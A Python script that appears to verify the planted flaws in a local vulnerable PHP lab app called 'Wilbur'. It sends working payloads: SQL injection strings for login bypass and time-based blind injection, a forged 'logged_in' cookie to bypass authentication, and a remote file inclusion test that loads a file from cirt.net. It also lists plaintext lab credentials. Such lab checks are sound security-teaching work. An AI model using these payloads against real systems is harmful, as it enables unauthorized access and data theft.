import requests
import time
import random

WILBUR = "http://localhost:8005"

KNOWN_USERS =     users = [
        {
            "user": "wilburwhateley",
            "pass": "+yog_sototh"
        },
        {
            "user": "lavinia",
            "pass": "Ad9XPzFTEf"
        },
        {
            "user": "herbwest",
            "pass": "bodies_just,so_many_bodies!"
        },
        {
            "user": "pickmann",
            "pass": "MyS3cr3t1sThatIUs3Phot0References"
        },
        {
            "user": "moncada",
            "pass": "dingdong"
        },
    ]

def test_login(username, password):
    data = {
        "fname": username,
        "fpass": password
    }
    res = requests.post(WILBUR + "/login.php", data=data)
    if "logged in" in res.text:
        return True
    return False

def main():
    # Check for info.php
    res = requests.get(WILBUR + "/info.php")
    if res.status_code == 200:
        print("✅ info.php")
    else:
        print("❌ info.php")


    # Check if local file inclusion is possible
    res = requests.get(WILBUR + "/blog.php?file=blog.php")
    lfi = ";" in res.text or "$" in res.text
    if lfi:
        print("✅ Local file inclusion")
    else:
        print("❌ Local file inclusion")

    
     # Check if remote file inclusion is possible
    res = requests.get(WILBUR + "/blog.php?file=http://cirt.net/rfiinc.txt")
    rfi = "phpinfo" in res.text
    if rfi:
        print("✅ Remote file inclusion")
    else:
        print("❌ Remote file inclusion")

    # Check for directory access
    for url in [WILBUR+"/secretTexts", WILBUR+"/dir"]:
        res = requests.get(url)
        if res.status_code == 200 and "Apache" in res.text:
            print("✅ Directory access at "+ url)
        else:
            print("❌ Directory access at "+ url)

    # Check for login cookie
    session = requests.Session()
    session.cookies.set("logged_in", "any")
    res = session.get(WILBUR+"/messages.php")
    if "You need an account" not in res.text:
        print("✅ 'logged_in' cookie at /messages.php")
    else:
        print("❌ 'logged_in' cookie at /messages.php")


    # Check if one can post files without permissions via backupblog.php
    data = {
        "submit": "any",
    }
    session = requests.Session()
    session.cookies.set("logged_in", "any")
    res = session.post(WILBUR + "/backupblog.php", data=data)
    if "file was not uploaded" in res.text:
        print(f"✅ 'logged_in' cookie at /backupblog.php")
    else:
        print(f"❌ 'logged_in' cookie at /backupblog.php")
    
    # Check if one can post files without permissions via admin.php
    data = {
        "submit": "any",
    }
    session = requests.Session()
    session.cookies.set("logged_in", "any")
    res = session.post(WILBUR + "/admin.php", data=data)
    if "file was not uploaded" in res.text:
        print(f"✅ 'logged_in' cookie at /admin.php")
        # Check for (blind) sql injection in admin.php
        data["title"] = "a', 'b'); do sleep(3); -- "
        session = requests.Session()
        session.cookies.set("logged_in", "any")
        start = time.time()
        res = session.post(WILBUR + "/admin.php", data=data, files={"file":(str(random.random()), b"content")})
        if time.time()-start > 3:
            print("✅ SQL injection in 'admin.php'")
        else:
            print("❌ SQL injection in 'admin.php'")
    else:
        print(f"❌ 'logged_in' cookie at /admin.php (check sql injection in admin im logged in!!!!)")
    
    # Check for sql injection in login.php
    sql_user = "' or 1=1;--"
    sql_pass = "pass"
    if test_login(sql_user, sql_pass):
        print("✅ SQL injection in 'login.php'")
    else:
        print("❌ SQL injection in 'login.php'")


    # Check for user login
    for user in KNOWN_USERS:
            if test_login(user["user"], user["pass"]):
                print(f"✅ Login {user['user']}")
            else:
                print(f"❌ Login {user['user']}")






    


if __name__=="__main__":
    try:
        main()
    except requests.ConnectionError:
        print("Could not reach " + WILBUR)
